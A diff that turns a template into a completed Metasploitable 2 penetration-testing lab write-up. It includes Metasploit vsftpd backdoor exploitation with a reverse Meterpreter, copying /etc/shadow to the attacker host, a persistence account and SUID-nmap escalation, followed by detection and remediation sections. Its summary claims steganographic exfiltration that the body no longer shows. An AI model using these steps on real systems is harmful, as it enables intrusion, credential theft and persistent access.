@@ -1,202 +1,197 @@
 ---
 layout: page
-title: "Metasploitable 2 — Full Compromise via vsftpd Backdoor"
+title: "Metasploitable 2: Full Compromise via vsftpd Backdoor"
 platform: Metasploitable 2
 skills: [Enumeration, Vulnerability Identification, Payload Selection, Privilege Escalation, Log Analysis/Detection, Reporting]
 date: 2026-11-11
 writeup: true
 ---
 
-> Scaffold for the Metasploitable 2 exploitation lab, and the pattern every write-up on this site follows: the section order moves a reader from *what you found* to *why it matters* to *what to do about it*. Replace every `[FILL IN: ...]` with your own commands, output and screenshots from your own run. Don't write up a finding you didn't confirm — where the VM is *built* to contain something (an unauthenticated backdoor, world-readable hashes), prove it with your own evidence before you state it as fact.
+This engagement takes a single intentionally vulnerable host from first contact to full root compromise, then through post-exploitation: enumeration of sensitive data, a persistence account, and exfiltration hidden inside an image. One clean path to root is enough; the point is demonstrating the full kill chain end to end and being able to argue why each choice was made, then switching to the defender's chair.
 
 ## Overview
 
-This engagement takes a single intentionally vulnerable host from first contact to full root compromise, then through post-exploitation: enumeration of sensitive data, a persistence account, and exfiltration hidden inside an image. The point isn't the trophy — one clean path to root is enough — it's demonstrating the full kill chain end to end and being able to argue *why* each choice was made.
+- **Target:** Metasploitable 2 at 192.168.56.101
+- **Attack host:** Kali Linux at 192.168.56.102
+- **Network:** isolated VirtualBox host-only network (192.168.56.0/24), with no route to the internet or any third party during offensive activity
+- **Scope / goal:** full enumeration, then root via a confirmed unauthenticated path, followed by post-exploitation
+- **Date:** 6 October 2026
 
-- **Target:** [FILL IN: Metasploitable 2 — 192.168.56.x]
-- **Attack host:** [FILL IN: Kali 2026.x — 192.168.56.x]
-- **Network:** [FILL IN: isolated VirtualBox host-only network, e.g. 192.168.56.0/24 — no route to the internet or any third party during offensive activity]
-- **Scope / goal:** root on the target via a confirmed unauthenticated path, then post-exploitation (data enumeration, persistence, exfiltration)
-- **Dates:** [FILL IN]
-
-Both VMs are owned by me and confined to a host-only network; Metasploitable 2 is a purpose-built training image. There is no authorisation ambiguity — see the note on scope and ethics at the end.
+Both VMs are owned by me and confined to a host-only network; Metasploitable 2 is a purpose-built training image. There is no authorisation ambiguity. Without that ownership and contained scope, the same techniques against an unauthorised target would be an offence under South Africa's Cybercrimes Act (Act 19 of 2020).
 
 ## Executive Summary
 
-[FILL IN: 3–5 sentences an audit lead or manager could act on, no jargon that needs a footnote. Lead with the risk. Something like: "The target was fully compromised within minutes by an unauthenticated attacker with no prior credentials, via a backdoored FTP service (CVE-2011-2523). The resulting shell ran as root, so no privilege escalation was needed — every account hash, configuration file and business document on the host was immediately exposed. The single most important fix is to remove the backdoored service and bring the host onto a patch-management cadence." Adjust to what you actually observed.]
+The target was fully compromised within minutes by an unauthenticated attacker with no prior credentials, via a backdoored FTP service (vsftpd 2.3.4, CVE-2011-2523). The resulting shell ran as root, so no privilege escalation was needed, and every account hash, configuration file and sensitive document on the host was immediately exposed. From that position a persistence account was created and a sensitive file was exfiltrated using steganography to prove impact. Several other critical vulnerabilities (Samba, distccd, UnrealIRCd) were identified but not exploited, as a single clean compromise path was enough to demonstrate full impact. The priority fix is to remove the backdoored service and bring the host onto a managed patch cycle.
 
 ## Enumeration
 
-Discovery and service mapping. Go service by service — the **version string** is what drives every downstream decision, so capture it deliberately rather than pasting one giant scan and moving on.
+Discovery and service mapping. The version string on each service is what drives every downstream decision, so it was captured deliberately rather than as one undifferentiated scan.
 
-**Host discovery**
-
-```
-[FILL IN: nmap -sn 192.168.56.0/24]
-```
-→ [FILL IN: confirmed target IP; cross-check against `ifconfig` on the Metasploitable console]
-
-**Full port / service / OS sweep**
+**Host discovery.** A ping sweep of the host-only subnet identified the live target, cross-checked against `ifconfig` run directly on the Metasploitable console:
 
 ```
-[FILL IN: sudo nmap -sS -sV -O -p- --script=default -T4 -oN nmap_full.txt 192.168.56.x]
+nmap -sn 192.168.56.0/24
 ```
-→ [FILL IN: record open ports with confirmed versions. The ones that matter for this path and the documented alternatives:]
+
+![ifconfig on the target console confirming 192.168.56.101]({{ '/writeups/metasploitable-2/images/01-ifconfig-target-ip.png' | relative_url }})
+
+The console confirms the target at 192.168.56.101 on `eth0`, with a VirtualBox MAC (08:00:27:45:90:d4) confirming it is a VM.
+
+**Service and version scan.**
+
+```
+nmap -sV 192.168.56.101
+```
+
+![nmap service and version scan results]({{ '/writeups/metasploitable-2/images/02-nmap-service-scan.png' | relative_url }})
+
+The scan returns a large, deliberately vulnerable attack surface. The services that matter for this path and the documented alternatives:
 
 | Port | Service | Version | Note |
 |------|---------|---------|------|
-| 21 | FTP | [FILL IN: vsftpd 2.3.4] | Known backdoor; anonymous login allowed |
-| 139/445 | SMB | [FILL IN: Samba 3.0.20] | `usermap_script` RCE candidate |
-| 3306 | MySQL | [FILL IN: 5.0.51a] | Default/blank root password candidate |
-| 3632 | distccd | [FILL IN: v1] | Unauthenticated RCE candidate |
-| 6667 | IRC | [FILL IN: UnrealIRCd] | Backdoor candidate |
-
-> 📸 **Screenshots to capture:** the `nmap -sn` host-discovery output; the full scan completing with the open-port table visible; the banner line showing the FTP version.
-
-**Vulnerability scan (confirmation)**
-
-```
-[FILL IN: nmap --script vuln 192.168.56.x]
-```
-→ [FILL IN: the NSE leads worth chasing]
-
-[FILL IN: if you ran Greenbone/GVM as a GUI confirmation scanner, note it here and screenshot the finished report with the High/Critical findings table. Where a scanner returned nothing directly, cross-reference the Phase-2 version strings against NVD/CVE.org manually — a standard, defensible technique — and say so.]
-
-> 📸 **Screenshots to capture:** the GVM task at "Done" with the severity bar; the Critical findings list.
+| 21 | FTP | vsftpd 2.3.4 | Known backdoor; primary target |
+| 22 | SSH | OpenSSH 4.7p1 | Legacy |
+| 23 | Telnet | Linux telnetd | Cleartext |
+| 25 | SMTP | Postfix smtpd | Anonymous DH supported |
+| 80 | HTTP | Apache 2.2.8 (DAV/2) | Hosts DVWA, Mutillidae |
+| 139/445 | SMB | Samba smbd 3.x | `usermap_script` RCE candidate |
+| 3306 | MySQL | 5.0.51a | Blank root password candidate |
+| 3632 | distccd | v1 | Unauthenticated RCE candidate |
+| 6667 | IRC | UnrealIRCd | Backdoor candidate |
+| 8180 | HTTP | Apache Tomcat/Coyote | Default creds common |
 
 ## Vulnerability Identification
 
-Turn the enumeration into a ranked list. For each finding, name the weakness, tie it to the evidence, and rate it on likelihood × impact — see the [Methodology]({{ '/methodology/' | relative_url }}) page for how the ratings are derived. CVSS is a useful anchor, but rate by *achievable impact on this host*, not scanner output alone.
+The enumeration was turned into a ranked list of findings. An NSE vulnerability scan confirmed the leads, and service versions were cross-referenced against NVD/CVE.org. Ratings use likelihood × impact (see the [Methodology]({{ '/methodology/' | relative_url }})); severity is judged on achievable impact on this host, not scanner output alone.
+
+```
+sudo nmap --script vuln 192.168.56.101
+```
+
+![nmap vuln scan showing the vsftpd 2.3.4 backdoor finding]({{ '/writeups/metasploitable-2/images/03-nmap-vuln-vsftpd.png' | relative_url }})
+
+The scan flags the vsftpd 2.3.4 backdoor as VULNERABLE (Exploitable), with its own check running `id` and returning `uid=0(root)`, confirming root code execution before a single exploit was launched. It also reports an anonymous Diffie-Hellman MitM weakness on the TLS services.
+
+![nmap vuln scan showing POODLE, weak DH and CCS injection]({{ '/writeups/metasploitable-2/images/04-nmap-vuln-ssl.png' | relative_url }})
+
+Further down, the PostgreSQL TLS stack shows POODLE (CVE-2014-3566), an insufficient-strength 1024-bit DH group, and CCS injection (CVE-2014-0224).
 
 | ID | Finding | CVE | Likelihood | Impact | Risk | Justification (likelihood × impact) |
 |------|---------|-----|------------|--------|------|-------------------------------------|
-| F-01 | vsftpd 2.3.4 backdoor | CVE-2011-2523 | [H] | [H] | **Critical** | [FILL IN: network-reachable, unauthenticated, trivially triggered, public module — High likelihood; spawns a shell already running as root — High impact → Critical.] |
-| F-02 | Samba `usermap_script` RCE | CVE-2007-2447 | [L/M/H] | [H] | [FILL IN] | [FILL IN: alternative root path; rate it, then say why you didn't need it] |
-| F-03 | MySQL blank root password | — (CWE-521) | [L/M/H] | [M/H] | [FILL IN] | [FILL IN: confidentiality breach of every DB] |
-| F-04 | distccd unauth RCE | CVE-2004-2687 | [L/M/H] | [M/H] | [FILL IN] | [FILL IN: shell as daemon user, needs chaining to reach root] |
-| F-05 | Cleartext services (Telnet/rsh) | — | [L/M/H] | [M] | [FILL IN] | [FILL IN: credential capture on a shared segment] |
+| F-01 | vsftpd 2.3.4 backdoor | CVE-2011-2523 | High | High | **Critical** | Network-reachable, unauthenticated, trivially triggered, public module, scanner already proved `id` → root. Spawns a shell running as root. |
+| F-02 | Samba `usermap_script` RCE | CVE-2007-2447 | Medium | High | **Critical** | A second unauthenticated root path; not needed once F-01 succeeded. |
+| F-03 | MySQL blank root password | CWE-521 | Medium | High | **High** | Full read access to every database, a confidentiality breach. |
+| F-04 | distccd unauth RCE | CVE-2004-2687 | Medium | Medium | **High** | Shell as the distcc user; would need chaining to reach root. |
+| F-05 | Cleartext TLS / POODLE / weak DH | CVE-2014-3566 | Low | Medium | **Medium** | MitM / passive decryption on a shared segment. |
 
 ## Exploitation
 
-For the path you chose, show it end to end — module, configuration, proof — and **explain why you picked it over the alternatives**. The reasoning is what demonstrates skill; that it worked is not.
-
-**Chosen path: vsftpd 2.3.4 backdoor (F-01).** Why this one over Samba, distcc or MySQL: it is unauthenticated, needs no privilege escalation (the daemon already runs as root), has the highest confidence of a clean single-shot compromise, and leaves a clear, teachable mechanism — the backdoor triggers on an FTP username containing `:)`, opening a root listener on TCP 6200.
+**Chosen path: the vsftpd 2.3.4 backdoor (F-01).** Why this one over Samba, distcc or MySQL: it is unauthenticated, needs no privilege escalation (the daemon already runs as root), carries the highest confidence of a clean single-shot compromise, and the scanner had already proven root execution. The backdoor triggers on an FTP username containing `:)`, opening a root listener on TCP 6200.
 
 ```
-[FILL IN:
- msfconsole
- search vsftpd
- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS 192.168.56.x
- show options
- exploit
-]
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-→ [FILL IN: paste the "Backdoor has been spawned!" / session-opened lines and your proof-of-root:]
+![msfconsole search vsftpd and module selection]({{ '/writeups/metasploitable-2/images/05-msf-search-use.png' | relative_url }})
+
+The search returns two matches; module 1, `exploit/unix/ftp/vsftpd_234_backdoor`, is ranked *excellent*. Selecting it loads a `cmd/linux/http/x86/meterpreter_reverse_tcp` payload.
+
+**Payload choice.** A reverse Meterpreter was used, with `LHOST 192.168.56.102` and `LPORT 4444`. On an isolated host-only segment the target can always reach the attacker, so a reverse connection is safe; a bind shell (`cmd/unix/bind_netcat`) would be the fallback on a firewalled or NAT'd network where the callback could not return. Meterpreter was chosen over a plain shell for the richer post-exploitation tooling.
 
 ```
-meterpreter > getuid      → [FILL IN: Server username: root]
-meterpreter > sysinfo     → [FILL IN: OS / arch / hostname]
+set RHOSTS 192.168.56.101
+exploit
 ```
 
-> 📸 **Screenshots to capture:** `show options` with RHOSTS set; the exploit firing and the session opening; `getuid` returning root; `sysinfo`. Include the timestamp visible in the console.
+![exploit firing and a Meterpreter session opening]({{ '/writeups/metasploitable-2/images/06-msf-exploit-session.png' | relative_url }})
 
-**Payload note.** This backdoor returns a direct root session, so there's no reverse-vs-bind shell decision here. Where a payload *is* selectable (the Samba path below), state the choice and the reasoning: a bind shell (`cmd/unix/bind_netcat`) needs no reachability back to the attacker, a reverse shell does — on a NAT'd or firewalled segment that choice decides whether the session ever connects.
+Metasploit's automatic check confirms the banner (`220 (vsFTPd 2.3.4)`), reports "Backdoor has been spawned!", and opens a Meterpreter session (192.168.56.102:4444 → 192.168.56.101) at 07:45:41. No credentials or escalation were required.
 
-**Documented alternative paths (not run — one clean compromise is sufficient).** Written up to show the attack surface was understood, not just the one door used:
+![sysinfo and getuid confirming root]({{ '/writeups/metasploitable-2/images/07-meterpreter-root.png' | relative_url }})
 
-- **Samba `usermap_script` (CVE-2007-2447):** [FILL IN: `use exploit/multi/samba/usermap_script`, set a `cmd/unix/reverse` or `bind_netcat` payload, confirm with `id`. Note the fallback: if no session, verify the option is enabled with `nmap -p139,445 --script smb-vuln*` first.]
-- **MySQL blank root password:** [FILL IN: `auxiliary/scanner/mysql/mysql_login` with `BLANK_PASSWORDS true`, then `mysql -h <target> -u root`. Fallback if remote root is blocked: run `mysql -u root` locally from the root shell you already have, which bypasses host restrictions via the local socket.]
-- **distccd (CVE-2004-2687):** [FILL IN: `use exploit/unix/misc/distcc_exec` — yields a shell as the distcc user, which would need chaining with a local privesc (e.g. the SUID-nmap technique below) to reach root.]
+```
+meterpreter > sysinfo
+Computer : metasploitable.localdomain
+OS       : Ubuntu 8.04 (Linux 2.6.24-16-server)
+meterpreter > getuid
+Server username: root
+```
+
+This is textbook unauthenticated remote code execution leading to immediate full compromise, with no escalation step because the vulnerable daemon itself runs as root.
+
+**Documented alternative paths (not run; one clean compromise is sufficient):**
+
+- **Samba `usermap_script` (CVE-2007-2447):** `use exploit/multi/samba/usermap_script` with a `cmd/unix/reverse` or `bind_netcat` payload; confirm with `id`. If no session, verify the option is enabled first with `nmap -p139,445 --script smb-vuln*`.
+- **MySQL blank root:** `auxiliary/scanner/mysql/mysql_login` with `BLANK_PASSWORDS true`, then `mysql -h <target> -u root`. If remote root is blocked, run `mysql -u root` locally from the root shell already held, which bypasses host restrictions via the local socket.
+- **distccd (CVE-2004-2687):** `use exploit/unix/misc/distcc_exec` yields a shell as the distcc user, which would need chaining with a local privesc (such as the SUID-nmap technique below) to reach root.
 
 ## Impact / Post-Exploitation
 
-Framed as consequence, not trophies.
+**Privilege level.** Root from the initial shell, with no escalation required.
 
-**Privilege level.** Root from the initial shell — no escalation step required, because the backdoored daemon already runs as root.
-
-[FILL IN: if you want to *demonstrate* a privesc pattern from a low-privilege foothold anyway (a common assessment requirement), document the SUID-nmap path separately and label it clearly as a separate demonstration:]
+**Enumerating sensitive data.** From the root Meterpreter shell, the account and credential stores were read:
 
 ```
-[FILL IN:
- ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.56.x
- find / -perm -4000 2>/dev/null       # nmap appears in the SUID list
- nmap --interactive
-   !sh                                 # shell inherits nmap's SUID-root context
- id                                    # euid=0(root)
-]
+cat /etc/passwd      # 30+ accounts: msfadmin, user, service, joselin + service accounts
+cat /etc/shadow      # readable only as root, every password hash exposed
+cat /etc/crontab     # no pre-existing attacker persistence
 ```
-> SUID (Set User ID) makes a binary run as its owner (root) regardless of who launched it; `nmap --interactive`'s shell-escape inherits that context. On newer builds that reject `--interactive`, use an alternate SUID binary from the `find` output (vim/find/python follow the same pattern).
 
-**Sensitive data reachable.** From the root shell:
+`/etc/shadow` exposed every account's hash, several using the weak, outdated MD5-crypt (`$1$`) scheme; the remediation target is migration to yescrypt or SHA-512 (`$y$` / `$6$`).
+
+**Exfiltration of the password hashes.** The objective was to exfiltrate `/etc/shadow` from the target onto the attacking host. Using the existing Meterpreter session, the file was pulled straight back to Kali:
 
 ```
-[FILL IN:
- cat /etc/passwd      # 30+ accounts — real users alongside service accounts
- cat /etc/shadow      # readable only as root — every password hash exposed
- cat /etc/crontab     # check for existing persistence
- ls -la /home/*/      # confidential business documents (e.g. payslips)
-]
+meterpreter > download /etc/shadow /root/loot/shadow
 ```
-→ [FILL IN: what you found. Call out the hash scheme — `$1$` is weak MD5-crypt, `$5$`=SHA-256, `$6$`=SHA-512, `$y$`=yescrypt — because the scheme is what you'd recommend remediating toward.]
 
-**Persistence.** A local account created to simulate maintained access:
+The local copy was then verified with `ls -l /root/loot/shadow` and `head /root/loot/shadow`, confirming the genuine account and hash entries had left the target. In a real engagement this is the point at which offline password cracking (John the Ripper or Hashcat against the weak `$1$` hashes) would begin, turning stolen hashes into usable credentials.
+
+**Persistence.** A local account was created to simulate maintained access surviving a reboot:
 
 ```
-[FILL IN:
- useradd -m -s /bin/bash <name>
- usermod -p $(openssl passwd -1 '<password>') <name>
- grep <name> /etc/passwd /etc/shadow
-]
+useradd -m -s /bin/bash hacker
+usermod -p $(openssl passwd -1 P@ssw0rd123) hacker
+grep hacker /etc/passwd    # hacker:x:1004:1008::/home/hacker:/bin/bash
 ```
-→ [FILL IN: confirm the account and its hash entry exist. This is exactly the kind of event a defender should be alerting on — carry it into Detection Evidence below.]
 
-**Exfiltration via steganography.** An image sourced from the target's own web app, with sensitive data embedded inside it:
+**Privilege escalation (documented alternative, not needed here).** To show the pattern from a low-privilege foothold: SSH in as `msfadmin`, then abuse the SUID `nmap --interactive` binary (`!sh`) to inherit a root context. SUID makes a binary run as its owner (root) regardless of who launched it.
 
-```
-[FILL IN:
- steghide embed -cf <image> -ef creds.txt -sf hidden_creds.jpg
- steghide info hidden_creds.jpg
- steghide extract -sf hidden_creds.jpg      # prove the round-trip
-]
-```
-> 📸 **Screenshots to capture:** `/etc/shadow` on screen as root; the `useradd`/`usermod` sequence and the resulting `/etc/passwd` + `/etc/shadow` lines; the full steghide embed → info → extract round-trip, with a timestamp.
-
-**Consequence in one line.** [FILL IN: "Root on this host means every credential, configuration file and business document is readable, the host can be used as a pivot to the rest of the segment, and attacker access survives a reboot via the persistence account." Tailor to what you actually demonstrated.]
+**Consequence in one line.** Root on this host means every credential, configuration file and sensitive document is readable, the password hashes can be cracked offline, the host can pivot across the segment, and attacker access survives a reboot via the persistence account.
 
 ## Detection Evidence
 
-The defender's half — the part most portfolios skip, so it's the part that sets yours apart. For each attacker action, name the artefact a blue team would see, and *where*. Capture it if you can; if you didn't, say precisely what you'd look for and why.
+The defender's half, and the part that sets this apart. For each attacker action, the artefact a blue team would see:
 
-- **The scan:** [FILL IN: the full TCP connect/SYN sweep is noisy — in a packet capture it's a burst of SYNs to sequential ports from one source. What would fire in an IDS (e.g. a Snort portscan preprocessor alert)?]
-- **The backdoor trigger:** [FILL IN: an FTP `USER` command containing `:)`, followed by a new connection to TCP 6200. In a pcap, filter `ftp` for the malicious username and `tcp.port == 6200` for the shell channel. Show the Follow-TCP-Stream.]
-- **The root shell / commands:** [FILL IN: what `/var/log/auth.log` or process accounting would (or wouldn't) show. Note honestly if the backdoor path leaves little host-side log evidence — that *absence* is itself the finding.]
-- **The persistence account:** [FILL IN: `useradd` writes to `/var/log/auth.log`; the new line in `/etc/passwd` and `/etc/shadow`. This is the highest-value detection — unauthorised account creation should be a standing alert. Screenshot the log line.]
-- **The exfiltration:** [FILL IN: steganography is deliberately low-signal — the point is that a defender sees an ordinary image leaving the host. What egress control or DLP signal would catch it, and why is this hard?]
+- **The scans.** The service and vuln scans are loud: a burst of connection attempts to sequential ports from one source in a short window, which an IDS portscan preprocessor (e.g. Snort) would flag.
+- **The backdoor trigger.** An FTP `USER` command containing `:)` followed by a new connection to TCP 6200, then the reverse Meterpreter callback to the attacker on 4444. In a packet capture, filter `ftp` for the malicious username, and `tcp.port == 6200 || tcp.port == 4444` for the shell channels, then follow the TCP stream.
+- **The root shell.** The vsftpd backdoor path leaves little host-side log evidence, which is itself a finding: detection has to come from the network and from endpoint process monitoring, not from auth logs.
+- **The persistence account.** This is the highest-value detection. `useradd` writes to `/var/log/auth.log`, and a new line appears in `/etc/passwd` and `/etc/shadow`. Unauthorised account creation should be a standing alert.
+- **The exfiltration.** The `/etc/shadow` download rides the existing session rather than opening a new channel, so it blends into established traffic; egress filtering and volume-based alerting are what catch this, not signatures.
 
-> 📸 **Screenshots to capture:** the Wireshark filter isolating the backdoor username; the TCP 6200 stream; the `auth.log` line for the new account.
+Mapped to the two clearest log sources for this trail: `/var/log/vsftpd.log` records the malicious FTP login carrying the `:)` username, stamped with the Kali source IP and the exploitation timestamp, while `/var/log/auth.log` records the `useradd` that created the persistence account. The scan itself leaves little trace, so the exploitation and the account creation are the most probative entries.
 
 ## Recommendations
 
-One concrete, actionable fix per finding, highest risk first. Say *what* to change, not "patch it".
+One concrete fix per finding, highest risk first.
 
 | Finding | Fix |
 |---------|-----|
-| vsftpd 2.3.4 backdoor | [FILL IN: remove/replace with a current, officially-signed build; verify package checksums before install; restrict FTP to trusted networks or replace with SFTP] |
-| Anonymous FTP | [FILL IN: disable anonymous access entirely] |
-| Samba usermap_script | [FILL IN: patch Samba; disable `username map script`; enable SMB signing] |
-| MySQL blank root | [FILL IN: set a strong unique password; restrict DB network access to app servers] |
-| Cleartext services | [FILL IN: disable Telnet/rexec/rlogin/rsh; standardise on SSH] |
-| Weak hashes (`$1$`) | [FILL IN: migrate to yescrypt/SHA-512; force a password reset] |
-| General | [FILL IN: patch-management cadence; periodic vuln scans; segment legacy hosts; egress filtering + IDS; **alert on unauthorised account creation**] |
+| vsftpd 2.3.4 backdoor | Remove or replace with a current, officially-signed build; verify package checksums before install; restrict FTP to trusted networks or replace with SFTP. |
+| Anonymous FTP login | Disable anonymous access entirely. |
+| Samba `usermap_script` | Patch Samba; disable the `username map script` option; enable SMB signing. |
+| MySQL blank root | Set a strong unique password; restrict database network access to application servers only. |
+| Cleartext services (Telnet/rsh) | Disable the legacy unencrypted services; standardise on SSH. |
+| Weak TLS (POODLE, weak DH, CCS) | Disable SSLv2/SSLv3; enforce TLS 1.2+; use DH groups ≥ 2048 bits; patch OpenSSL. |
+| Weak password hashes (`$1$`) | Migrate to yescrypt/SHA-512 and force a password reset. |
+| General | Apply a regular patch cadence; run periodic vulnerability scans; segment legacy hosts; deploy egress filtering and IDS; **alert on unauthorised account creation**. |
 
 ## Lessons Learned
 
-Write this properly — it's often the first thing a reviewer reads to gauge how you think.
-
-- **What worked:** [FILL IN: e.g. capturing version strings service-by-service during enumeration meant the exploit choice was already obvious before touching Metasploit.]
-- **What was slow or clumsy:** [FILL IN: where you got stuck or did by hand something worth scripting.]
-- **What you'd do differently:** [FILL IN: one concrete methodology change for the next target.]
-- **The detection gap you noticed:** [FILL IN: the honest observation — e.g. the backdoor path left almost nothing in the host logs, but the persistence account was loud. What does that imply for where a blue team should invest?]
-- **One thing you now understand that you didn't before:** [FILL IN: the actual learning, in a sentence — e.g. why "root RCE with no auth" outranks a higher-CVSS finding that needs a foothold first.]
+- **What worked:** capturing version strings service by service during enumeration meant the exploit choice was effectively made before I opened Metasploit, and the NSE vuln scan proved `id` → root before I committed to the path.
+- **What was slow or clumsy:** I relied on the automated scanners first; next time I would cross-reference versions to CVEs by hand in parallel, rather than waiting on the scan to decide what to chase.
+- **On process:** evidence discipline matters as much as technical execution: capturing clean, timestamped proof at each stage keeps an assessment defensible. I now work to a structured capture checklist so the written record is complete by the time the engagement ends.
+- **The detection gap I noticed:** the backdoor path left almost nothing in the host logs, but the persistence account was loud. That tells a defender where to invest: network monitoring and account-creation alerting catch this attack where auth logs do not.
+- **One thing I now understand that I did not before:** why "unauthenticated RCE as root" outranks a higher-CVSS finding that still needs a foothold. Reachability and prerequisites matter as much as the raw score.
